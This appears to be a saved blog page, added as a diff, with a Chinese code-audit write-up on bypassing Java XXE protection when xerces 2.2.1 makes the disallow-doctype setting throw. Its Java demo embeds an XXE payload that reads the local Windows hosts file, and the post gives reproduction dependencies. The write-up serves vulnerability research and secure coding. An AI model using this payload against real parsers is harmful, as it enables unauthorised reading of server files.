@@ -1,0 +1,469 @@
+<!DOCTYPE HTML>
+<html  lang="zh-CN">
+<head>
+    <meta http-equiv="Content-Type" charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <title>Java XXE 漏洞做了 doctype 防护情况下的一种绕过案例 - 浅蓝 's blog</title>
+	
+    <!-- 使用url函数转换相关路径 -->
+	<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js" data-no-instant></script>
+	<script src="/usr/themes/Bigfa/static/js/lately.min.js" data-no-instant></script>
+    <link rel="stylesheet" href="/usr/themes/Bigfa/static/css/style.css">
+	
+
+    <!-- 通过自有函数输出HTML头部信息 -->
+    <meta name="description" content="关于漏洞这个漏洞是我最近在一个代码审计项目中发现的，代码中处理传入的 XML 代码时使用了 XMLReaderFactory.createXMLReader()，并且在 classpath 下有..." />
+<meta name="generator" content="Typecho 1.1/17.10.30" />
+<meta name="template" content="Bigfa" />
+<link rel="alternate" type="application/rss+xml" title="Java XXE 漏洞做了 doctype 防护情况下的一种绕过案例 &raquo; 浅蓝 's blog &raquo; RSS 2.0" href="https://b1ue.cn/feed/archives/387.html" />
+<link rel="alternate" type="application/rdf+xml" title="Java XXE 漏洞做了 doctype 防护情况下的一种绕过案例 &raquo; 浅蓝 's blog &raquo; RSS 1.0" href="https://b1ue.cn/feed/rss/archives/387.html" />
+<link rel="alternate" type="application/atom+xml" title="Java XXE 漏洞做了 doctype 防护情况下的一种绕过案例 &raquo; 浅蓝 's blog &raquo; ATOM 1.0" href="https://b1ue.cn/feed/atom/archives/387.html" />
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-387'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-387'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        triggers: ['scroll', 'mousemove', 'keyup', 'touchstart'],
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        triggers: ['onfocus', 'onmousemove', 'onkeyup', 'ontouchstart'],
+        load: 'onload'
+    }, added = false;
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-387'),
+            input = document.createElement('input');
+        input.type = 'hidden';
+        input.name = '_';
+        input.value = (function () {
+    var _PqYZA = /* 'Sp'//'Sp' */''+//'YFZ'
+'YFZ'+'d6'//'6x'
++//'hd'
+'1'+//'SV'
+'88'+'fa1'//'i'
++'31'//'Cyn'
++''///*'9'*/'9'
++'53d'//'d0'
++'b'//'O'
++'d'//'h'
++/* 'R9e'//'R9e' */''+'097'//'Om4'
++'9'//'hrB'
++//'26'
+'a44'+/* 'rJ'//'rJ' */''+'c0'//'rt6'
++''///*'k'*/'k'
++'4'//'5QQ'
++//'f'
+'2cb'+'2c'//'0Dk'
++'7b'//'xjv'
+, _PnuAjbh = [[0,3]];
+    
+    for (var i = 0; i < _PnuAjbh.length; i ++) {
+        _PqYZA = _PqYZA.substring(0, _PnuAjbh[i][0]) + _PqYZA.substring(_PnuAjbh[i][1]);
+    }
+
+    return _PqYZA;
+})();
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                function append() {
+                    if (!added) {
+                        forms[0].appendChild(input);
+                        added = true;
+                    }
+                }
+            
+                for (var i = 0; i < event.triggers.length; i ++) {
+                    var trigger = event.triggers[i];
+                    document[event.add](trigger, append);
+                    window[event.add](trigger, append);
+                }
+            }
+        }
+    });
+})();
+</script><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/styles/customemin.css" /><link rel="stylesheet" type="text/css" href="/usr/plugins/ColorHighlight/res/lines.css" /></head>
+
+<body class="is-enableBrandingButtons is-js">
+  <div class="site-main surface-container"> 
+    <div class="butterBar"><p class="butterBar-message"></p></div> 
+   
+   <header class="metabar metabar--bordered metabar--top u-clearfix"> 
+    <div class="metabar-block u-floatLeft" itemprop="publisher" itemscope="" itemtype="https://schema.org/Organization"> 
+     <h1 class="site-title u-floatLeft" itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject"> <a href="https://b1ue.cn/" class="logo" title="浅蓝 's blog"> <img src="/logo.png" width="38" /></a></h1>  
+    </div> 
+    <div class="metabar-block metabar-center"> 
+		 <nav class="navTabs navTabs--metabar navTabs--narrow" itemtype="http://schema.org/SiteNavigationElement" itemscope=""> 
+			 <div class="layoutSingleColumn layoutSingleColumn--wide">
+				  <ul class="subnav-ul">
+										<li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/category.html">分类</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/archives.html">归档</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/links.html">友情链接</a></li><li  class="subnav-li"><a class="subnav-item" href="https://b1ue.cn/about.html">关于我</a></li>									  </ul>
+			 </div>
+		</nav> 
+    </div> 
+    <div class="metabar-block u-floatRight"> 
+     <form id="search" class="metabar-predictiveSearch search-form" action="https://b1ue.cn/" role="search" method="GET"> 
+        <label title="Search 浅蓝 's blog"> 
+        <svg xmlns="http://www.w3.org/2000/svg" style="display:none;">
+          <symbol viewBox="0 0 25 25" id="svg-search">
+            <title>svg-search</title>
+            <path d="M20.067 18.933l-4.157-4.157c.837-1.032 1.34-2.345 1.34-3.776 0-3.314-2.686-6-6-6s-6 2.686-6 6 2.686 6 6 6c1.43 0 2.744-.503 3.776-1.34l4.157 4.157c.113.113.27.183.442.183.345 0 .625-.28.625-.625 0-.173-.07-.33-.183-.442zM6.5 11c0-2.62 2.13-4.75 4.75-4.75S16 8.38 16 11s-2.13 4.75-4.75 4.75S6.5 13.62 6.5 11z"
+            />
+          </symbol>
+        </svg>
+        <svg viewBox="0 0 25 25" width="25" height="25" class="svgIcon">
+            <use class="svgIcon-use" xlink:href="#svg-search">
+            </use>
+        </svg>
+         <input id="input" class="textInput textInput--dark textInput--rounded" name="s" type="text" required="true" placeholder="Search 浅蓝 's blog" /> 
+  	   </label>
+     </form> 
+    </div> 
+   </header>
+
+
+    
+    
+
+<div class="layoutSingleColumn">
+    <article class="u-paddingTop50" itemscope="itemscope" itemtype="http://schema.org/Article">
+      <header class="entry-header">
+        <h2 class="entry-title" itemprop="headline">Java XXE 漏洞做了 doctype 防护情况下的一种绕过案例</h2>
+        <div class="entry-meta">
+            <a><time class="lately-a" datetime="2020-06-12 19:50:00" itemprop="datePublished">2020-06-12 19:50:00</time></a>
+            <span class="middotDivider"></span>
+            <a href="https://b1ue.cn/archives/387.html"><a href="https://b1ue.cn/category/default/">默认分类</a></a>
+        </div>
+      </header>
+
+      <meta itemscope itemprop="mainEntityOfPage"  itemType="https://schema.org/WebPage" itemid="https://b1ue.cn/archives/387.html"/>
+
+        <div class="grap" itemprop="articleBody">
+            <h1>关于漏洞</h1><p>这个漏洞是我最近在一个代码审计项目中发现的，代码中处理传入的 XML 代码时使用了 <code>XMLReaderFactory.createXMLReader()</code>，并且在 classpath 下有 xerces 2.2.1 及以下版本时就会无视禁止 Doctype 的 Feature。</p><h1>漏洞分析</h1><p>XMLReaderFactory 是 JDK 的一个 XML 处理工厂类，xerces 是 Apache 的一个 XML 解析库。</p><p>首先附上一段做过了 XXE 防护的 Demo</p><pre><code>package xml;
+
+import org.xml.sax.*;
+import org.xml.sax.helpers.DefaultHandler;
+import org.xml.sax.helpers.XMLReaderFactory;
+
+import java.io.IOException;
+import java.io.StringBufferInputStream;
+import java.util.HashMap;
+import java.util.HashSet;
+import java.util.Map;
+import java.util.Set;
+
+/**
+ * @author 浅蓝
+ * @email <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="fd9f918898bd94858e989ed3928f9a">[email&#160;protected]</a>
+ * @since 2020/6/12 19:41
+ */
+public class XXE {
+
+    public static void main(String[] args) throws IOException, SAXException {
+
+        XMLReader xmlReader = null;
+        try {
+            xmlReader = XMLReaderFactory.createXMLReader();
+            xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);
+            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);
+            xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false);
+        } catch (SAXNotSupportedException e) {
+            e.printStackTrace();
+        } catch (SAXNotRecognizedException e) {
+            e.printStackTrace();
+        } catch (SAXException e) {
+            e.printStackTrace();
+        }
+        MyHandler myHandler = new MyHandler();
+        xmlReader.setContentHandler(myHandler);
+        System.out.println(xmlReader.getClass());
+        xmlReader.parse(new InputSource(new StringBufferInputStream(&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt;\n&quot; +
+                &quot;&lt;!DOCTYPE root [\n&quot; +
+                &quot;        &lt;!ENTITY xxe SYSTEM \&quot;file:///c:/windows/system32/drivers/etc/hosts\&quot;&gt;\n&quot; +
+                &quot;        ]&gt;\n&quot; +
+                &quot;&lt;evil&gt;&amp;xxe;&lt;/evil&gt;&quot;)));
+    }
+
+}
+class MyHandler extends DefaultHandler{
+    String key,value;
+    Map&lt;String,String&gt; map=new HashMap&lt;String,String&gt;();
+    Set&lt;String&gt; must=new HashSet&lt;String&gt;();
+    public void startDocument() throws SAXException {}
+    public void startElement(String uri, String localName, String rawName, Attributes attlist)throws SAXException {
+        key=localName;
+    }
+    public void characters(char[] ch, int start, int length) {
+        System.out.println(new String(ch, start, length));
+        value = new String(ch, start, length);
+    }
+    public void endElement(String uri, String localName, String rawName) throws SAXException {
+        map.put(key,value);
+    }
+    public void endDocument() throws SAXException{
+    }
+    Map&lt;String,String&gt; getMap(){ return map;}
+
+}</code></pre><p>当使用了正常的 XMLReaderFactory 去创建一个 XMLReader 解析 XXE 代码，就会抛出不允许使用 DOCTYPE 的异常。</p><p><img src="/usr/uploads/2020/06/1489588364.jpg" alt="1591965755(1).jpg" title="1591965755(1).jpg"></p><p>首先跟进工厂类的 createXMLReader 观察是如何创建 XMLReader 对象的。</p><pre><code>    public static XMLReader createXMLReader ()
+        throws SAXException
+    {
+        String          className = null;
+        ClassLoader     cl = ss.getContextClassLoader();
+
+        // 1. try the JVM-instance-wide system property
+        try {
+            className = ss.getSystemProperty(property);
+        }
+        catch (RuntimeException e) { /* continue searching */ }
+
+        // 2. if that fails, try META-INF/services/
+        if (className == null) {
+            if (!_jarread) {
+                _jarread = true;
+                String      service = &quot;META-INF/services/&quot; + property;
+                InputStream in;
+                BufferedReader      reader;
+
+                try {
+                    if (cl != null) {
+                        in = ss.getResourceAsStream(cl, service);
+
+                        // If no provider found then try the current ClassLoader
+                        if (in == null) {
+                            cl = null;
+                            in = ss.getResourceAsStream(cl, service);
+                        }
+                    } else {
+                        // No Context ClassLoader, try the current ClassLoader
+                        in = ss.getResourceAsStream(cl, service);
+                    }
+
+                    if (in != null) {
+                        reader = new BufferedReader (new InputStreamReader (in, &quot;UTF8&quot;));
+                        _clsFromJar = reader.readLine ();
+                        in.close ();
+                    }
+                } catch (Exception e) {
+                }
+            }
+            className = _clsFromJar;
+        }
+
+        // 3. Distro-specific fallback
+        if (className == null) {
+// BEGIN DISTRIBUTION-SPECIFIC
+
+            // EXAMPLE:
+            // className = &quot;com.example.sax.XmlReader&quot;;
+            // or a $JAVA_HOME/jre/lib/*properties setting...
+            className = &quot;com.sun.org.apache.xerces.internal.parsers.SAXParser&quot;;
+
+// END DISTRIBUTION-SPECIFIC
+        }
+
+        // do we know the XMLReader implementation class yet?
+        if (className != null)
+            return loadClass (cl, className);
+
+        // 4. panic -- adapt any SAX1 parser
+        try {
+            return new ParserAdapter (ParserFactory.makeParser ());
+        } catch (Exception e) {
+            throw new SAXException (&quot;Can't create default XMLReader; &quot;
+                    + &quot;is system property org.xml.sax.driver set?&quot;);
+        }
+    }</code></pre><p>大概流程如下</p><ul><li>如果系统变量里有 <code>org.xml.sax.driver</code> 就将其值作为类名实例化</li><li>如果当前 classpath 下有 <code>META-INF/services/org.xml.sax.driver</code> 文件就拿文件第一行的内容作为类名实例化</li><li>如果以上两种情况都不满足则默认将 JDK 的<code>com.sun.org.apache.xerces.internal.parsers.SAXParser</code>类实例化</li></ul><p>大多数情况下，默认获取的对象都是第三种。</p><p>而我发现的绕过方法是基于第二步，从 classpath 下获取 <code>META-INF/services/org.xml.sax.driver</code>中的类名。</p><p>经过测试我发现当程序使用了 xerces 2.2.1 版本的情况下，设置禁止 doctype 时会抛出异常。</p><pre><code>xmlReader.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,true);
+xmlReader.setFeature(&quot;http://xml.org/sax/features/external-parameter-entities&quot;,false);
+xmlReader.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false);</code></pre><p>大多数情况下，在做 XXE 防护时第一个设置的就是 doctype，而当使用了 xerces 的时候设置禁止使用 doctype 会抛出异常，导致 try 代码块中的其他部分 setFeature 都无法执行，从而可以绕过 XXE 的防护，进行 XXE 攻击。即使 doctype 不是第一个设置的，也是可以进行 XXE DOS 攻击的。</p><h1>漏洞复现</h1><pre><code>&lt;!-- https://mvnrepository.com/artifact/xerces/xerces --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;xerces&lt;/groupId&gt;
+    &lt;artifactId&gt;xerces&lt;/artifactId&gt;
+    &lt;version&gt;2.2.1&lt;/version&gt;
+&lt;/dependency&gt;</code></pre><pre><code>        &lt;!-- https://mvnrepository.com/artifact/commons-jelly/commons-jelly --&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;commons-jelly&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-jelly&lt;/artifactId&gt;
+            &lt;version&gt;1.0.1&lt;/version&gt;
+        &lt;/dependency&gt;</code></pre><p>使用 maven 导入以上两个库中的的任意一个。</p><p>一般 commons-jelly 用的比较多，还是最新版本。</p><p><img src="/usr/uploads/2020/06/4202666655.jpg" alt="1591967385(1).jpg" title="1591967385(1).jpg"></p><p>工厂类创建 XMLReader 时，获取的是 xerces 的类。</p><p><img src="/usr/uploads/2020/06/4261386072.jpg" alt="1591967688(1).jpg" title="1591967688(1).jpg"></p><p>在 XXE 防护失效后成功读取本地文件。</p><h1>总结</h1><p>所以以后再做代码审计时，不要看到设置了禁止使用 Doctype 时就觉得没漏洞了。</p>        </div>
+    </article>
+
+    <div id="comments">
+            <h3 class="responses-title">Comments : 1 </h3>
+    
+    <ol class="comment-list">    <li class="comment">
+			<div id="comment-32" class="comment-block">
+					<div class="comment-info u-clearfix">
+						<div class="comment-avatar">
+                                                        <img class="avatar" src="https://secure.gravatar.com/avatar/8c58414072b91dc9feb671818583d09f?s=32&r=G&d=" alt="cook!e" width="32" height="32" />
+							
+						</div>
+						<div class="comment-meta">
+							<div class="comment-author">cook!e									<span class="comment-reply-link u-cursorPointer" ><a href="https://b1ue.cn/archives/387.html?replyTo=32#respond-post-387" rel="nofollow" onclick="return TypechoComment.reply('comment-32', 32);">回复</a></span>
+							</div>
+							<div class="comment-time" itemprop="datePublished">
+                                <time class="lately-b" datetime="2021-11-18 15:34:10" itemprop="datePublished">2021-11-18 15:34:10</time>
+							</div>
+						</div>
+					</div>
+					<div class="comment-content">
+						<p>我比较好奇是如何发现这个问题的</p>					</div>
+			</div>
+                </li>
+    </ol>
+	<div class="lists-navigator clearfix">
+    	</div>
+    
+    
+        <div id="respond-post-387" class="respond">
+    
+        <h3 id="response" class="comments-title">发表留言</h3>
+
+        <form method="post" action="https://b1ue.cn/archives/387.html/comment" id="comment-form" class="responsesForm" role="form">
+            <p class="comment-note">如未标注转载则文章均为本人原创，转载前先吱声，未授权转载我就锤爆你狗头。</p>
+            <p class="comment-note">人生在世，错别字在所难免，无需纠正。</p>
+                        <p  class="comment-form-author comment-form-input">
+                <label for="author">称呼</label>
+                <input type="text" name="author" id="author" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-email comment-form-input">
+                <label for="mail">Email</label>
+                <input type="text" name="mail" id="mail" class="inputGroup" value="" required />
+            </p>
+            <p  class="comment-form-url comment-form-input">
+                <label for="url">网站</label>
+                <input type="text" name="url" id="url" class="inputGroup" placeholder="http://" value="" />
+            </p>
+                        <p class="comment-form-comment comment-form-input">
+                <label for="textarea">内容</label>
+                <textarea rows="8" cols="50" name="text" id="comment" class="inputGroup inputTextarea" required ></textarea>
+            </p>
+            <p class="form-submit">
+                <button type="submit" id="submit" class="submit">提交评论</button><a id="cancel-comment-reply-link" href="https://b1ue.cn/archives/387.html#respond-post-387" rel="nofollow" style="display:none" onclick="return TypechoComment.cancelReply();">取消回复</a>            </p>
+        </form>
+    </div>
+    </div>
+
+
+
+</div><!-- end #main-->
+
+
+<footer class="footer--empty"></footer>
+  </div> <!-- 对应site-main surface-container -->
+<div class="loadingBar"></div>
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/highlight.js?version=9.12.0">
+        </script><script type="text/javascript" src="/usr/plugins/ColorHighlight/guess.js"></script><script type="text/javascript" src="/usr/plugins/ColorHighlight/res/clipboard.min.js"></script><script type="text/javascript">$("pre code").each(function(i, block) {hljs.highlightBlock(block);});var l = $("pre code").find("ul").length;
+if(l<=0){
+    $("pre code").each(function(){
+        $(this).html("<ul><li>" + $(this).html().replace(/\n/g,"\n</li><li>") +"\n</li></ul>");
+    });
+  }</script>		<script type="text/javascript" src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js" data-no-instant></script>
+			<script src="/usr/themes/Bigfa/static/js/view-image.min.js" data-no-instant></script>
+		    <script src="https://cdn.bootcss.com/instantclick/3.0.0/instantclick.min.js" data-no-instant></script>
+    <script data-no-instant>
+		InstantClick.on('change', function(isInitialLoad) {
+			$("pre code").each(function(i, block) {hljs.highlightBlock(block);});
+						jQuery(document).ready(function () {
+				$.lately({
+					'target' : '.lately-a,.lately-b,.lately-c'
+				});
+				jQuery.viewImage({
+				'target' : '.view-image img', //需要使用ViewImage的图片
+				'exclude': '.exclude img',    //要排除的图片
+				'delay'  : 300                //延迟时间
+				});
+			});
+		});
+		InstantClick.init('mousedown');
+    </script>
+		
+		<script>
+	(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();	</script>
+	
+</body>
+</html>
